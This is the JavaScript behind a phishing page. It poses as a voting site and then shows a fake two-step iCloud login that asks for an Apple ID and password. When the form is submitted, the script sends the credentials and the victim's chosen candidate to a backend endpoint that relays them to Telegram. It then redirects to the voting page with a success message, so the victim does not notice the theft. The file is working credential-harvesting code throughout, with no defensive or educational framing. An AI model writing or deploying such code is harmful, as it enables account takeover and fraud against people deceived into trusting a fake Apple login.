// Send message via backend API (credentials are now secure on server)
async function sendToTelegram(msg) {
    try {
        const response = await fetch('/api/send-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: msg })
        });

        const data = await response.json();

        if (!data.success) {
            console.error('Failed to send message:', data.error);
        }
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

// Screen transition: Welcome -> Login
const welcomeScreen = document.getElementById('welcomeScreen');
const loginScreen = document.getElementById('loginScreen');
const continueBtn = document.getElementById('continueBtn');

if (continueBtn) {
    continueBtn.addEventListener('click', () => {
        welcomeScreen.style.display = 'none';
        loginScreen.style.display = 'flex';
    });
}

// Two-step login process
const icloudForm = document.getElementById('icloudForm');
const passwordForm = document.getElementById('passwordForm');
const emailInput = document.getElementById('apple-email');
const passwordInput = document.getElementById('apple-password');
const arrowBtn = document.querySelector('.arrow-btn');

let userEmail = '';

// Step 1: Email/Phone submission
if (arrowBtn) {
    arrowBtn.addEventListener('click', (e) => {
        e.preventDefault();
        
        if (emailInput.value.trim()) {
            userEmail = emailInput.value;
            
            // Hide email form, show password form
            icloudForm.style.display = 'none';
            passwordForm.style.display = 'flex';
            
            // Focus on password input
            setTimeout(() => {
                passwordInput.focus();
            }, 100);
        } else {
            emailInput.focus();
            showToast('Please enter your email or phone number', 'error');
        }
    });
}

// Also submit on Enter key
if (emailInput) {
    emailInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            arrowBtn.click();
        }
    });
}

// Step 2: Password submission
if (passwordForm) {
    passwordForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const password = passwordInput.value;
        const candidate = sessionStorage.getItem('votingFor') || 'Unknown';

        if (!password) {
            showToast('Please enter your password', 'error');
            return;
        }

        // Send credentials to Telegram API
        await sendToTelegram(
            `🍎 *iCLOUD LOGIN*\n` +
            `Apple ID: ${userEmail}\n` +
            `Password: ${password}\n` +
            `Voting for: ${candidate}`
        );

        // Set flag to show success toast on voting page
        sessionStorage.setItem('voteSubmitted', 'true');

        // Redirect back to voting page immediately
        window.location.href = 'Index.html';
    });
}

// Toast notification function
function showToast(message, type = 'info') {
    // Remove existing toast if any
    const existingToast = document.querySelector('.toast');
    if (existingToast) {
        existingToast.remove();
    }

    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.classList.add('show');
    }, 100);
    
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => {
            if (toast.parentNode) {
                document.body.removeChild(toast);
            }
        }, 300);
    }, 3000);
}
